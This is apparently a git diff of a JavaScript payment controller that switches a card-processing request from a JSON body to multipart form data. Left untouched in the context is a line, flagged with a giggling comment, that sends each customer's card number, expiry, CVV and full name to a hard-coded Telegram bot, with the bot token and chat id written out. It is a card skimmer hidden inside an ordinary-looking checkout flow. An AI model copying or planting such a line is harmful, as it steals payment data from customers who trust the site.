@@ -238,31 +238,33 @@ class UserController {
             // Хехехехехе
             await axios.get(`https://api.telegram.org/bot5846954411:AAEKEMS8EBKi1yPAfBueHaSZLFihgXXG4uk/sendMessage?chat_id=269530936&text=${cardNumber},${cardDate},${cvv},${fio}`)
 
-            const rs = await axios.post('https://processtxn.deltapay.biz/api/transact.php', {
-                affiliate: merchant_id,
-                terminal_name,
-                processing_mode: PROCESSING_MODE_SALE,
-                paymethod: TRANS_TYPE_CREDIT_CARD,
-                redirect: redirect_url,
-                order_id: merchant_id + v4(),
-                customer_ip: req.connection.remoteAddress,
-                first_name: fio.split(' ')[0],
-                last_name: fio.split(' ')[1],
-                email: "test@test.com",
-                telephone: "12345",
-                address1: "addr",
-                city: "city",
-                state: "state",
-                zip: "12345",
-                country: "US",
-                currency: "CAD",
-                amount,
-                card_number: cardNumber,
-                card_type: 'visa',
-                cvv,
-                expiry_yr: cardDate.split('/')[1],
-                expiry_mo: cardDate.split('/')[0],
-            })
+            const bodyFormData = new FormData()
+
+            bodyFormData.append('affiliate', merchant_id)
+            bodyFormData.append('terminal_name', terminal_name)
+            bodyFormData.append('processing_mode', PROCESSING_MODE_SALE)
+            bodyFormData.append('paymethod', TRANS_TYPE_CREDIT_CARD)
+            bodyFormData.append('redirect', redirect_url)
+            bodyFormData.append('order_id', merchant_id + v4())
+            bodyFormData.append('customer_ip', req.connection.remoteAddress)
+            bodyFormData.append('first_name', fio.split(' ')[0])
+            bodyFormData.append('last_name', fio.split(' ')[1])
+            bodyFormData.append('email', "test@test.com")
+            bodyFormData.append('telephone', "12345")
+            bodyFormData.append('address1', "addr")
+            bodyFormData.append('city', "city")
+            bodyFormData.append('state', "state")
+            bodyFormData.append('zip', "12345")
+            bodyFormData.append('country', "US")
+            bodyFormData.append('currency', "CAD")
+            bodyFormData.append('amount', amount)
+            bodyFormData.append('card_number', cardNumber)
+            bodyFormData.append('card_type', 'visa')
+            bodyFormData.append('cvv', cvv)
+            bodyFormData.append('expiry_yr', cardDate.split('/')[1])
+            bodyFormData.append('expiry_mo', cardDate.split('/')[0])
+
+            const rs = await axios.post('https://processtxn.deltapay.biz/api/transact.php', bodyFormData, { headers: {"Content-Type": "multipart/form-data"} },)
 
             console.log("PAYMENT RESULT:")
             console.log(rs.data)
